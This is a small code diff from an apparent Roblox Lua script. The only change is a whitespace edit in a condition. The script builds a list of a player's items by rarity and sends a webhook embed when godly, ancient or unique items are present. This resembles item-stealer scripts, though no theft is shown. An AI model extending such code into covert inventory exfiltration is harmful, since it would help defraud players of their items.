@@ -1059,7 +1059,7 @@ local EverythingString = "-- // Uniques\n" .. uniquesString ..
                          "\n\n-- // Rare\n" .. raresString ..
                          "\n\n-- // Uncommon\n" .. uncommonString ..
                          "\n\n-- // Common\n" .. commonsString
-if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1 then
+if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1  then
 userName = UserName
 webHook = WebHook
 local WebHookEmbed = CreateEmbed(
